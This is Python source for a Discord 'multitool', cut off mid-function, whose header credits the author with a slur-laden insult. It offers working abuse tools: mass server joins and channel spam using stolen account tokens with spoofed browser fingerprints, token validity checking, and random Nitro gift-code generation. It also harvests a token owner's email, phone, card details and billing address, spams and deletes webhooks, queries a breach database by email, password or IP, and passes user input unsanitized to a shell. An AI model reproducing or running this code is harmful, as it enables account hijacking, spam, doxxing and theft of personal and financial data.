# Github: https://github.com/Scarlxrd211
# Made By Scarlxrd 1337
# Change ASCII or be Skid = Gay
# Telegram: https://t.me/Sicarioweb
# Tiktok: suka.multitool

__author__ = 'Scarlxrd_1337'
__github__ = 'https://github.com/Scarlxrd211'
__skid_alert__ = 'Please Dont be a skid and be respectfull with my work'
__python_version__ = '3.11.8'

# Make All Imports
import os 
import sys
import time
import json
import requests
import random
import string
import tls_client
import discord
import asyncio
from colorama import *

# Verify Python Version
version_path = sys.version_info
complete = f'{version_path.major}.{version_path.minor}.{version_path.micro}'
if __python_version__ != complete:
    os.system('cls')
    print(f'{Fore.WHITE}The Current Version of Python is {complete}. The necessary version of Python is {__python_version__}')
    print(' ')
    print(f'{Fore.WHITE}Windows: https://www.python.org/ftp/python/3.11.8/python-3.11.8-amd64.exe')
    print(f'{Fore.WHITE}MacOs: https://www.python.org/ftp/python/3.11.8/python-3.11.8-macos11.pkg')
    print(" ")
    print("=====================================================================================================================")
    print(' ')
    print(f'How to install Python on Windows: https://www.youtube.com/watch?v=nU2Egc3Zx3Q')
    sys.exit(1)

from init_tool import init_func
from discord.ext import commands
from colorama import *
from banner import *
from fonctions import *
from datetime import datetime, timezone

# Define Color Variables
G = Fore.GREEN
P = Fore.MAGENTA
R = Fore.RED
Y = Fore.YELLOW
C = Fore.CYAN
B = Fore.BLUE
W = Fore.WHITE

# Set Title
os.system('Title Suka-Multitool On Top')

# Token Joiner Class
class DiscordJoinerPY:
    def __init__(self):
        self.client = tls_client.Session(
            client_identifier="chrome112",
            random_tls_extension_order=True
        )
        self.tokens = []
        self.proxies = []
        self.check()
    
    # Define Hearders
    def headers(self, token: str):
        headers = {
            'authority': 'discord.com',
            'accept': '*/*',
            'accept-language': 'it-IT,it;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': token,
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/channels/@me',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'x-context-properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6IjExMDQzNzg1NDMwNzg2Mzc1OTEiLCJsb2NhdGlvbl9jaGFubmVsX2lkIjoiMTEwNzI4NDk3MTkwMDYzMzIzMCIsImxvY2F0aW9uX2NoYW5uZWxfdHlwZSI6MH0=',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-GB',
            'x-super-properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6Iml0LUlUIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMi4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEyLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE5MzkwNiwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
        }
        return headers
    
    # Define Cookies
    def cookies(self):
        cookies = {}
        try:
            response = self.client.get('https://discord.com')
            for cookie in response.cookies:
                if cookie.name.startswith('__') and cookie.name.endswith('uid'):
                    cookies[cookie.name] = cookie.value
                return cookies
        
        except Exception as e:
            print(f'{R}[X] Failed to get cookies ({e})')
            return cookies

    # Join Request
    def join(self, token: str, invite: str, proxy_: str):
        payload = {
            'session_id': ''.join(random.choice(string.ascii_lowercase) + random.choice(string.digits) for _ in range(16))
        }

        proxy = {
            "http": f"http://{proxy_}",
            "https": f"https://{proxy_}"

        } if proxy_ else None

        try:
            response = self.client.post(
                url=f'https://discord.com/api/v9/invites/{invite}',
                headers=self.headers(token=token),
                json=payload,
                cookies=self.cookies(),
                proxy=proxy
            )
            
            response_json = response.json()
            if response.status_code == 200:
                print(f'{G}[+] Token: {token[:10]} Successfuly Joined')
            elif response.status_code == 401:
                print(f'{R}[X] Token: {token[:10]} Invalid Token')
            elif response.status_code == 403:
                print(f'{Y}[!] Token: {token[:10]} Flagged Token')
            elif response.status_code == 400 and response_json['captcha_key'] == ['You need to update your app to join this server.']:
                print(f'{Y}[!] Token: {token[:10]} Token With Hcaptcha')
            elif response_json['message'] == "404: Not Found":
                print(f'{R}[X] Invite: {invite} Unknown invite')
            else:
                print(f'{R}[X] Invalid: {response_json}')
        except Exception as error:
            print(f'{R}[X] Error: {error}')

    # Check if files exists
    def check(self):
        folder_path = "data/token_joiner"
        file_path = os.path.join(folder_path, "tokens.txt")

        if not os.path.exists(folder_path):
            os.makedirs(folder_path)

        if not os.path.exists(file_path):
            for file_name in ['proxies.txt', 'tokens.txt']:
                file_path = os.path.join(folder_path, file_name)
                if not os.path.exists(file_path):
                    with open(file_path, "w") as file:
                        file.write("Delete! proxies: ip:port:host:pass")

        self.load_tokens()

    # Load Tokens
    def load_tokens(self):
        try:
            with open("./data/token_joiner/tokens.txt", "r") as file:
                for line in file:
                    content = line.replace("\n",  "")
                    self.tokens.append(content)

            self.start()
        except Exception as error:
            print(f'{R}[X] Error: {error}')

    # Load Proxies
    def load_proxies(self):
        try:
            with open("./input/proxies.txt", "r") as file:
                for line in file:
                    content = line.replace("\n",  "")
                    self.proxies.append(content)
        except Exception as error:
            print(f'{R}[X] Error: {error}')

    # Main Joiner Function
    def start(self):
        clear()
        joiner_banner()
        if len(self.tokens) == 0:
            print(f'{Y}[!] There is no tokens in file. (data/token_joiner/tokens.txt)')
            input(f'{main_color()}[@] Press enter to continue...')
            main()

        invite = input(f"{main_color()}[+] Link: discord.gg/")
        print(' ')
        for token in self.tokens:
            try:
                proxy = None
                self.join(token, invite, None)
            except Exception as error:
                print(f'{R}[X] Error: {error}')
        print(' ')
        input(f'{main_color()}[@] All token joined server with invite https://discord.gg/{invite}. Press enter to continue...')
        main()

# Define Clear funcion
def clear():
    os.system('cls')


########################################################################################################################################
######################################## Tools Utils and credits for options number 6  #################################################
########################################################################################################################################


# Option Clear files
def clear_all_file():
    nitro_gift_checker = 'data/nitro_gift_checker'
    token_checker_path = 'data/token_checker'
    tokens_info = 'data/token_infos'
    generator_path = 'data/gift_generator'
    snusbase_path = 'data/snusbase'
    joiner_path = 'data/token_joiner'
    spammer_path = 'data/token_spammer'
    print(' ')
    print(f'{main_color()}[/] 1 - Nitro Gift Checker Files')
    print(f'{main_color()}[/] 2 - Token Checker Files')
    print(f'{main_color()}[/] 3 - Tokens Informations Files')
    print(f'{main_color()}[/] 4 - Nitro Gift Generator Files')
    print(f'{main_color()}[/] 5 - SnusBase Results Files')
    print(f'{main_color()}[/] 6 - Token Joiner Files')
    print(f'{main_color()}[/] 7 - Token Spammer Files')
    print(f'{main_color()}[/] 9 - Clear All Files')
    print(f'{main_color()}[/] 99 - Back To Menu')
    print(' ')
    choice = input(f'{main_color()}[?] Choice: ')
    if int(choice) == 99:
        main()
    if int(choice) == 1:
        with open(f'{nitro_gift_checker}/input.txt', 'w'):
            pass
        with open(f'{nitro_gift_checker}/invalids.txt', 'w'):
            pass
        with open(f'{nitro_gift_checker}/valids.txt', 'w'):
            pass
        print(f'{main_color()}[@] All files are cleared for nitro gift checker')
        time.sleep(4)
        main()
    if int(choice) == 2:
        with open(f'{token_checker_path}/tokens.txt', 'w'):
            pass
        with open(f'{token_checker_path}/valids.txt', 'w'):
            pass
        with open(f'{token_checker_path}/invalids.txt', 'w'):
            pass
        with open(f'{token_checker_path}/locked.txt', 'w'):
            pass
        print(f'{main_color()}[@] All files are cleared for token checker')
        time.sleep(4)
        main()
    if int(choice) == 3:
        for file in os.listdir(tokens_info):
            os.remove(f'{tokens_info}/{file}')
        print(f'{main_color()}[@] All files are cleared for token informations')
        time.sleep(4)
        main()
    if int(choice) == 4:
        with open(f'{generator_path}/output.txt', 'w') as f:
            pass
        print(f'{main_color()}[@] All files are cleared for nitro gift generator')
        time.sleep(4)
        main()
    if int(choice) == 5:
        for file in os.listdir(snusbase_path):
            os.remove(f'{snusbase_path}/{file}')
        print(f'{main_color()}[@] All files are cleared for snusbase results')
        time.sleep(4)
        main()
    if choice == 6:
        with open(f'{joiner_path}/tokens.txt', 'w') as f:
            pass
        print(f'{main_color()}[@] All files are cleared for token joiner')
        time.sleep(4)
        main()
    if choice == 7:
        with open(f'{spammer_path}/tokens.txt', 'w') as f:
            pass
        print(f'{main_color()}[@] All files are cleared for token spammer')
        time.sleep(4)
        main()
    if int(choice) == 9:
        with open(f'{nitro_gift_checker}/input.txt', 'w'):
            pass
        with open(f'{nitro_gift_checker}/invalids.txt', 'w'):
            pass
        with open(f'{nitro_gift_checker}/valids.txt', 'w'):
            pass
        with open(f'{token_checker_path}/tokens.txt', 'w'):
            pass
        with open(f'{token_checker_path}/valids.txt', 'w'):
            pass
        with open(f'{token_checker_path}/invalids.txt', 'w'):
            pass
        with open(f'{token_checker_path}/locked.txt', 'w'):
            pass
        for file in os.listdir(tokens_info):
            os.remove(f'{tokens_info}/{file}')
        for file in os.listdir(snusbase_path):
            os.remove(f'{snusbase_path}/{file}')
        with open(f'{generator_path}/output.txt', 'w') as f:
            pass
        with open(f'{joiner_path}/tokens.txt', 'w') as f:
            pass
        with open(f'{spammer_path}/tokens.txt', 'w') as f:
            pass
        print(f'{main_color()}[@] All files are cleared for this tool')
        time.sleep(4)
        main()

# Change Tool Color
def change_style():
    print(" ")
    print(f'{B}[/>] 1 - Blue{W}')
    print(f'{G}[/>] 2 - Green{W}')
    print(f'{R}[/>] 3 - Red{W}')
    print(f'{Y}[/>] 4 - Yellow{W}')
    print(f'{P}[/>] 5 - Purple{W}') 
    print(f'{C}[/>] 6 - Cyan{W}')
    print(f'{W}[/>] 7 - White')
    print(' ')
    try:
        option = int(input(f'{main_color()}[+] Choice: '))
        if not (1 <= option <= 7):
            raise ValueError
    except ValueError:
        print('Provide a Number (not a text/string) between 1 and 5')
        time.sleep(2)
        clear()
        return main()
    
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
        
        config['style'] = option
        
        with open('config.json', 'w') as f:
            json.dump(config, f, indent=4)
        
        clear()
        return main()
    except Exception as e:
        print(f"An error occurred: {e}")
        time.sleep(2)
        clear()
        return main()
    
########################################################################################################################################
############################################## Discord Tools Options Number 1 ##########################################################
########################################################################################################################################

# Gen code function for nitro generator
def gen_code(indent):
    chars = string.ascii_letters + string.digits
    generate = ''.join(random.choice(chars) for _ in range(indent))
    return generate

# Main Templates (Ascii + choice input)
def discord_tools_choice():
    clear()
    discord_tools_banners()
    choice = sinput('Choice: ')
    if choice == "1":
        check_token()
    elif choice == "2":
        token_spammer()
    elif choice == "3":
        DiscordJoinerPY()
    elif choice == "4":
        accounts_info()
    elif choice == "5":
        hypersquad_changer()
    elif choice == "6":
        webhook_spammer()
    elif choice == '7':
        webhook_delete()
    elif choice == '8':
        webhook_infos()
    elif choice == "9":
        gift_generator()
    elif choice == "10":
        check_nitro_gift()
    elif choice == 'z':
        main()
    else:
        input(f'{main_color()}[!] Please choose a valid option !. Press enter to continue...')
        discord_tools_choice()

# Token Check Option
def check_token():
    try:
        clear()
        token_check_banner()
        file_path = 'data/token_checker'
        with open(f'{file_path}/tokens.txt', 'r') as f:
            if len(f.read().splitlines()) == 0:
                print(f'{Y}[!] There is any token in {file_path}/tokens.txt')
                time.sleep(2)
                main()
            else:        
                ask = str(input(f"{main_color()}[?] Do you wan't clear all checked token files (y/n)?: "))
                if ask == 'y':
                    with open(f'{file_path}/valids.txt', 'w') as f:
                        pass
                    with open(f'{file_path}/invalids.txt', 'w') as f:
                        pass
                    with open(f'{file_path}/locked.txt', 'w') as f:
                        pass
                    print(f'{main_color()}[@] All checked tokens files are cleared')
                    time.sleep(3)

                clear()
                token_check_banner()
                valids = 0
                invalids = 0
                locked = 0
                error = 0
                with open(f'{file_path}/tokens.txt', 'r') as f:
                    for line in f.read().splitlines():
                        token = line.strip()
                        headers = {
                            'Authorization': token
                        }
                        req = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
                        if req.status_code == 200:
                            with open(f"{file_path}/valids.txt", 'a') as file:
                                file.write(token + "\n")
                            valids += 1
                            print(f'{G}[+] Token: {token[:34]}.****.****** Are Valid')
                        elif req.status_code == 401:
                            with open(f"{file_path}/invalids.txt", 'a') as file:
                                file.write(token + "\n")           
                            invalids += 1
                            print(f'{R}[+] Token: {token[:34]}.****.****** Are Invalid')
                        elif req.status_code == 403:
                            with open(f"{file_path}/locked.txt", 'a') as file:
                                file.write(token + "\n")  
                            locked += 1
                            print(f'{Y}[!] Token: {token[:34]}.****.****** Are Locked') 
                        elif req.status_code == 429:
                            print(f'{Y}[!] You are behing rate limited. (sleeping 10 sec)')
                            time.sleep(10)
                        else:
                            error += 1
                            print(f'{R}[X] Error with checking token {token[:34]}.******.****')
                    print(' ')
                    print(f'{main_color()}[@] All Token are checked: {valids} Valids / {invalids} Invalids / {locked} Locked / {error} Error')
                    input(f'{main_color()}[@] Press enter to continue...')
                    main()
    except Exception as e:
        print(e)

# Token Spammer Option
def token_spammer():
    clear()
    banner_spammer()
    file_path = 'data/token_spammer/tokens.txt'
    with open(file_path) as f:
        tokens = f.read().splitlines()
    if len(tokens) == 0:
        print(f'{Y}[!] There is any token in file. (data/token_spammer/tokens.txt)')
        input(f'{main_color()}[@] Press enter to continue...')
        main(

        )
    message = str(input(f'{main_color()}[?] Message you want to send: '))
    number = int(input(f'{main_color()}[?] Number of message will be sent: '))
    channel_id = int(input(f'{main_color()}[?] Channel id you want spam: '))
    
    token_index = 0
    num_tokens = len(tokens)

    for _ in range(number):
        header = {
            "Authorization": tokens[token_index]
        }
        
        token_index = (token_index + 1) % num_tokens
        
        json_data = {
            "mobile_network_type": "unknown",
            "content": message,
            "nonce": nonce_generator(),
            "tts": False,
            "flags": 0
        }
        req = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=header, json=json_data)
        if req.status_code == 200:
            print(f'{G}[+] Token: {tokens[token_index][:49]}****.****.****** Message successfuly sent')
        else:
            print(f'{R}[X] Token: {tokens[token_index][:49]}****.****.****** Error with spamming')
    input(f'{main_color()}[@] Spamming finished... Press enter to continue...')
    main()

# Token HypeSquad Changer Option
def hypersquad_changer():
    clear()
    hypesquad_banner()
    token = sinput('Please enter token: ')
    print(' ')
    print(f'{main_color()}[/>] 1 - Bravery \n[/>] 2 - Brillance \n[/>] 3 - Balance')
    choice = int(sinput('Choice: '))
    if not (0 < choice < 4):
        print(f'{R}[!] Please provide a number in menu !')
        time.sleep(2)
        main()
    headers = {
        'Authorization': token
    }
    payload = {"house_id":int(choice)}
    req = requests.post('https://discord.com/api/v9/hypesquad/online', headers=headers, json=payload)
    if req.status_code == 204:
        print('')
        input(f'{main_color()}[@] HypeSquad Successfuly changed ! Press enter to continue...')
        main()
    elif req.status_code == 401:
        print('')
        input(f'{R}[X] Token invalid. Press enter to continue...')
        main()
    else:   
        print('')
        input(f'{main_color()}[!] Error. Press enter to continue...')
        main()

# Nitro Checker Option
def check_nitro_gift():
    clear()
    token_check_banner()
    now = datetime.now(timezone.utc)
    formatted_date = now.strftime('%Y-%m-%dT%H:%M:%S%z')
    formatted_date = formatted_date[:-2] + ':' + formatted_date[-2:]
    file_path = 'data/nitro_gift_checker'
    with open(f'{file_path}/input.txt', 'r') as f:
        if len(f.read().splitlines()) == 0:
            print(f'{R}[!] Any link to check are in file (input.txt)')
            input(f'{main_color()}[@] Press enter to continue...')
            return main()
        else:
            valids = 0
            invalids = 0
            with open(f'{file_path}/input.txt', 'r') as f:
                for line in f.read().splitlines():
                    nitro  = line.strip()
                    url = f"https://discord.com/api/v9/entitlements/gift-codes/{nitro[21:]}"
                    req = requests.get(url)
                    if req.status_code == 200:
                        response = req.json()
                        expires_at = response.get('expires_at')
                        if expires_at and formatted_date > expires_at:
                            with open(f'{file_path}/invalids.txt', 'a', encoding='utf-8') as file:
                                file.write(nitro + " (expired)\n")
                            invalids += 1
                            print(f'{R}[!] Nitro Link {nitro} Are Expired')
                            continue
                        if response.get('uses') == response.get('max_uses'):
                            with open(f'{file_path}/invalids.txt', 'a', encoding='utf-8') as file:
                                file.write(nitro + " (already redeemed)\n")
                            invalids += 1    
                            print(f'{Y}[!] Nitro Link {nitro} Are Claimed')
                            continue  
                        if response.get('redeemed', True):
                            with open(f'{file_path}/invalids.txt', 'a', encoding='utf-8') as file:
                                file.write(nitro + " (already redeemed)\n")
                            invalids += 1
                            print(f'{Y}[!] Nitro Link {nitro} Are Claimed')
                        else:
                            with open(f'{file_path}/valids.txt', 'a', encoding='utf-8') as file:
                                file.write(nitro + "\n")
                            valids += 1
                            print(f'{G}[+] Nitro Link {nitro} Are Valid')
                    else:
                        with open(f'{file_path}/invalids.txt', 'a', encoding='utf-8') as file:
                            file.write(nitro + " (invalid response)\n")
                        invalids += 1
                        print(f'{R}[!] Nitro Link {nitro} Are Invalid')
                    time.sleep(5)
                input(f'{main_color()}[@] All nitro are checked: {valids} Valids / {invalids} Invalids. Press enter to continue...')
                main()

# Nitro Generatior Option
def gift_generator():
    clear()
    gen_banner()
    number = int(sinput('Please enter number of link u want generate: '))
    if (number < 0):
        print(f'{R}[!] Please provide a number over 1')
        time.sleep(4)
        return main()
    for i in range(number):
        code = gen_code(16)
        with open('data/gift_generator/output.txt', 'a') as f:
            f.write(f'https://discord.gift/{code}\n')
        print(f'{main_color()}[>] https://discord.gift/{code}')
    input(f'{main_color()}[@] Nitro are saved in data/gift_generator/output.txt. Press enter to continue...')
    main()

# Token All Info option + File Saving
def accounts_info():
    clear()
    all_info_banner()
    file_path = 'data/token_infos'
    token = sinput(f'Enter Token: ')
    headers = {
        'Authorization': token
    }       
    req = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
    if req.status_code == 200:
        nitro = ''
        response = req.json()
        email =  response.get('email')
        user_id = response.get('id')
        username = response.get('username')
        avatar = response.get('avatar')
        banner = response.get('banner')
        phone = response.get('phone')
        mail_verified = response.get('verified')
        mfa = response.get('mfa_enabled')
        nitro_status = response.get('premium_type')

        if nitro_status == 1:
            nitro += "Nitro Basic"
        elif nitro_status == 2:
            nitro += "Nitro Boost"
        else:
            nitro += "No Nitro"
        req2 = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers)
        resp2 = req2.json()
        with open(f'{file_path}/{user_id}.txt', 'a', encoding='utf-8') as f:
            f.write(all_info_towrite())
            f.write(f"""=========================Tokens Informations and Data Parsing=========================

Username: {username}
User Id: {user_id}
Nitro Type: {nitro}
Email: {email}
Mail Verified: {mail_verified}
Phone Number: {phone}
Mfa: {mfa}
Avatar: https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png
Banner: https://cdn.discordapp.com/banners/{user_id}/{banner}.png
""")
        print(f"""{main_color()}
{main_color()}=========================Tokens Informations and Data Parsing=========================

{main_color()}[+] Username: {W}{username}
{main_color()}[+] User Id: {W}{user_id}
{main_color()}[+] Nitro Type: {W}{nitro}
{main_color()}[+] Email: {W}{email}
{main_color()}[+] Mail Verified: {W}{mail_verified}
{main_color()}[+] Phone Number: {W}{phone}
{main_color()}[+] Mfa: {W}{mfa}
{main_color()}[+] Avatar: {W}https://cdn.discordapp.com/avatars/{user_id}/{avatar}.png
{main_color()}[+] Banner: {W}https://cdn.discordapp.com/banners/{user_id}/{banner}.png
""")
        for card in resp2:
            bank = card.get("brand")
            last_number = card.get("last_4")
            mexpire = card.get("expires_month")
            yexpire = card.get("expires_year")
            city = card.get("billing_address").get("city")
            postal = card.get("billing_address").get("postal_code")
            region = card.get("billing_address").get("state")
            address = card.get("billing_address").get("line_1")
            with open(f'{file_path}/{user_id}.txt', 'a') as f:
                f.write(f"=========================Payments methods and information=========================\n")
                f.write(f"Bank: {bank}\n")
                f.write(f"Last 4 cc numbers: {last_number}\n")
                f.write(f"Expire Month: {mexpire}\n")
                f.write(f"Expire Year: {yexpire}\n")
                f.write(f"City: {city}\n")
                f.write(f"Postal Code: {postal}\n")
                f.write(f"State: {region}\n")
                f.write(f"Address: {address}\n")
                f.write("\n")
            print(f"{main_color()}=========================Payments methods and information=========================\n")
            print(f"{main_color()}[+] Bank: {W}{bank}")
            print(f"{main_color()}[+] Last 4 cc numbers: {W}{last_number}")
            print(f"{main_color()}[+] Expire Month: {W}{mexpire}")
            print(f"{main_color()}[+] Expire Year: {W}{yexpire}")
            print(f"{main_color()}[+] City: {W}{city}")
            print(f"{main_color()}[+] Postal{W} Code: {postal}")
            print(f"{main_color()}[+] State: {W}{region}")
            print(f"{main_color()}[+] Address: {W}{address}")
            print("\n")
        print(f'{main_color()}[@] File Saved to {file_path}/{user_id}.txt')
        input(f'{main_color()}[@] Press enter to continue...')
        main()
    elif req.status_code == 401:
        print(f'{Y}[!] Token Invalid. Please retry with an other token.')
        input(f'{main_color()}[@] Press enter to continue...')
        main()
    else:
        print(f'{R}[X] Error with getting token informations. Please retry...')
        input(f'{main_color()}[@] Press enter to continue...')
        main()

# Webhook Spammer Option
def webhook_spammer():
    clear()
    banner_spammer()
    webhook_url = sinput(f'Webhook Url: ')
    num_messages = int(input(f'{main_color()}[?] Number of message to send: '))
    if num_messages < 0:
        print(f'{R}[!] You must provide an amount over 0')
        time.sleep(3)
        main()
        return
    content = str(input(f'{main_color()}[?] Message sent to webhook: '))
    for i in range(num_messages):
        req = requests.post(webhook_url, json={'content': content})
        if req.status_code == 204:
            print(f'{G}[+] Message successfuly sent to webhook')
        elif req.status_code == 401:
            print(f'{R}[X] Webhook invalid. Please retry with an other webhook')
            time.sleep(2)
            main()
        elif req.status_code == 429:
            print(f'{Y}[!] You are being rate limited. Sleeping for 5 sec')
            time.sleep(5)
    input(f'{main_color()}[@] {num_messages} messages sent to webhook. Press enter to continue...')
    main()

# Webhook Informations Option
def webhook_infos():
    clear()
    token_check_banner()
    webhook_url = sinput('Webhook Url: ')
    req = requests.get(webhook_url)
    if req.status_code == 200:
        response = req.json()
        application_id = response.get('application_id')
        webhook_id = response.get('id')
        avatar = response.get('avatar')
        channel_id  = response.get('channel_id')
        guild_id = response.get('guild_id')
        name = response.get('name')
        token = response.get('token')
        url = response.get('url')
        print(f'{main_color()}[+] Application Id:{W} {application_id}')
        print(f'{main_color()}[+] Guild Id:{W} {guild_id}')        
        print(f'{main_color()}[+] Channel Id:{W} {channel_id}')        
        print(f'{main_color()}[+] Webhook Id:{W} {webhook_id}')        
        print(f'{main_color()}[+] Webhook Token:{W} {token}')        
        print(f'{main_color()}[+] Webhook Name:{W} {name}')        
        print(f'{main_color()}[+] Webhook Url:{W} {url}')        
        print('')
        input(f'{main_color()}[@] Press enter to continue...')
        main()
    else:
        print(f'{R}[!] Invalid Webhook')
        time.sleep(2)
        main()     

# Webhook Delete Option
def webhook_delete():
    clear()
    link = sinput('Webhook Url: ')
    req = requests.delete(link)
    if req.status_code == 204:
        print(' ')
        input(f'{main_color()}[@] Webhook successfuly deleted. Press enter to continue...')
        main()
    else:
        print(f'{main_color()}[X] Error with deleting webhook')
        time.sleep(2)
        main()


########################################################################################################################################
############################################### SnusBase Api Tool Option Number ########################################################
########################################################################################################################################

# SnusBase Function using file fonction.py 
def snusbase_api():
    file_path = 'data/snusbase'
    clear()
    banner_snusbase()
    print(' ')
    choice = sinput('Choice: ')
    options = ["1","2","3","4","5","6","z"]
    if choice not in options:
        print(f'{Y}[!] Please provide a valid option{W}')
        time.sleep("2")
        return snusbase_api()

    if choice == "z":
        return main()

    print(" ")    

    data = input(f'{main_color()}[?] Please Enter Search Item: ')
    filename = f'{data}'.replace(' ', '_')

    # Email Search
    if choice == "1":
        response = api_email(data)
        if response == "rate limited":
            print(f'{Y}[!] You are behing rate limited')
            time.sleep("3")
            main()
        if response and 'results' in response:
            results = response['results']
            if results != {}:
                with open(f'{file_path}/{filename}.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{write_snusbase_banner()}')
                    for key, value in results.items():  
                        f.write(f'[/] Database Name: {key}\n')
                        print(f"{main_color()}[/] DataBase Name: {W}{key}")
                        for record in value: 
                            if isinstance(record, dict):  
                                for field, value in record.items(): 
                                    f.write(f'[+] {field}: {value}\n')
                                    print(f"{main_color()}[+] {field}: {W}{value}")
                        f.write('\n')
                        print('')
            else:
                print(f'{main_color()}[X] No Results Found With Snusbase')
                time.sleep(2)
                main()

    # Username Search
    if choice == "2":
        response = api_username(data)
        if response == "rate limited":
            print(f'{Y}[!] You are behing rate limited')
            time.sleep(3)
            main()
        if response and 'results' in response:
            results = response['results']
            if results != {}:
                with open(f'{file_path}/{filename}.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{write_snusbase_banner()}')
                    for key, value in results.items():  
                        f.write(f'[/] Database Name: {key}\n')
                        print(f"{main_color()}[/] DataBase Name: {W}{key}")
                        for record in value: 
                            if isinstance(record, dict):  
                                for field, value in record.items(): 
                                    f.write(f'[+] {field}: {value}\n')
                                    print(f"{main_color()}[+] {field}: {W}{value}")
                        f.write('\n')
                        print('')
            else:
                print(f'{main_color()}[X] No Results Found With Snusbase')
                time.sleep(1)
                main()

    # Hash Search
    if choice == "3":
        response = api_hash(data)
        if response == "rate limited":
            print(f'{Y}[!] You are behing rate limited')
            time.sleep(3)
            main()
        if response and 'results' in response:
            results = response['results']
            if results != {}:
                with open(f'{file_path}/{filename}.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{write_snusbase_banner()}')
                    for key, value in results.items():  
                        f.write(f'[/] Database Name: {key}\n')
                        print(f"{main_color()}[/] DataBase Name: {W}{key}")
                        for record in value: 
                            if isinstance(record, dict):  
                                for field, value in record.items(): 
                                    f.write(f'[+] {field}: {value}\n')
                                    print(f"{main_color()}[+] {field}: {W}{value}")
                        f.write('\n')
                        print('')
            else:
                print(f'{main_color()}[X] No Results Found With Snusbase')
                time.sleep(1)
                main()

    # Password Search
    if choice == "4":
        response = api_password(data)
        if response == "rate limited":
            print(f'{Y}[!] You are behing rate limited')
            time.sleep(3)
            main()
        if response and 'results' in response:
            results = response['results']
            if results != {}:
                with open(f'{file_path}/{filename}.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{write_snusbase_banner()}')
                    for key, value in results.items():  
                        f.write(f'[/] Database Name: {key}\n')
                        print(f"{main_color()}[/] DataBase Name: {W}{key}")
                        for record in value: 
                            if isinstance(record, dict):  
                                for field, value in record.items(): 
                                    f.write(f'[+] {field}: {value}\n')
                                    print(f"{main_color()}[+] {field}: {W}{value}")
                        f.write('\n')
                        print('')
            else:
                print(f'{main_color()}[X] No Results Found With Snusbase')
                time.sleep(1)
                main()

    # Full Name Search
    if choice == "5":
        response = api_name(data)
        if response == "rate limited":
            print(f'{Y}[!] You are behing rate limited')
            time.sleep(3)
            main()
        if response and 'results' in response:
            results = response['results']
            if results != {}:
                with open(f'{file_path}/{filename}.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{write_snusbase_banner()}')
                    for key, value in results.items():  
                        f.write(f'[/] Database Name: {key}\n')
                        print(f"{main_color()}[/] DataBase Name: {W}{key}")
                        for record in value: 
                            if isinstance(record, dict):  
                                for field, value in record.items(): 
                                    f.write(f'[+] {field}: {value}\n')
                                    print(f"{main_color()}[+] {field}: {W}{value}")
                        f.write('\n')
                        print('')
            else:
                print(f'{main_color()}[X] No Results Found With Snusbase')
                time.sleep(1)
                main()

    # Ip Address search
    if choice == "6":
        response = api_ip(data)
        if response == "rate limited":
            print(f'{Y}[!] You are behing rate limited')
            time.sleep(3)
            main()
        if response and 'results' in response:
            results = response['results']
            if results != {}:
                with open(f'{file_path}/{filename}.txt', 'a', encoding='utf-8') as f:
                    f.write(f'{write_snusbase_banner()}')
                    for key, value in results.items():  
                        f.write(f'[/] Database Name: {key}\n')
                        print(f"{main_color()}[/] DataBase Name: {W}{key}")
                        for record in value: 
                            if isinstance(record, dict):  
                                for field, value in record.items(): 
                                    f.write(f'[+] {field}: {value}\n')
                                    print(f"{main_color()}[+] {field}: {W}{value}")
                        f.write('\n')
                        print('')
            else:
                print(f'{main_color()}[X] No Results Found With Snusbase')
                time.sleep(1)
                main()

    input(f'{main_color()}[@] Press enter to continue...')
    main()

########################################################################################################################################
########################################## Osint Tools Choice Number 3 #################################################################
########################################################################################################################################

# Panel Menu + input
def osint():
    clear()
    osint_menu_banner()
    choice = sinput('Choice: ')
    if choice == "1":
        username_searcher()
    elif choice == "2":
        ip_lookup()
    elif choice == "3":
        holehe_mail()
    elif choice == "4":
        fivem_searcher()
    elif choice == "z":
        main()

# Holehe Reverse Mail lookup
def holehe_mail():
    clear()
    holehe_banner()
    mail = sinput('Email: ')
    os.system(f'holehe {mail}')
    input(f'{main_color()}[@] Press enter to continue...')
    main()

# Username Searcher (like blackbird/whatmyname/sherlock)
def username_searcher():
    clear()
    username_searcher_banner()
    username = sinput('Enter Username: ')
    print(' ')
    list_api = api_links(username)
    for link in list_api:
